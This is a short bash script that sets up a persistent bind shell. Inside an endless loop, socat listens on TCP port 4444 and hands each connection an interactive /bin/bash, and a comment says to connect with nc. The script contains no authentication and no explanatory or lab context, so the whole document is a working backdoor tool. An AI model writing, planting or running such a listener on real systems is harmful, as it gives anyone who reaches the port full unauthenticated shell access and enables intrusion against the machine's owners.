#!/bin/bash

PORT=4444
# Infinite loop to restart after disconnect

while true; do
  echo "[+] Listening on port $PORT..."
  # Create a raw TCP listener using socat
  socat TCP-LISTEN:$PORT,reuseaddr,fork EXEC:"/bin/bash -i",pty,stderr,setsid,sigint,sane
  sleep 1
done

# nc <ip> <port> to connect with
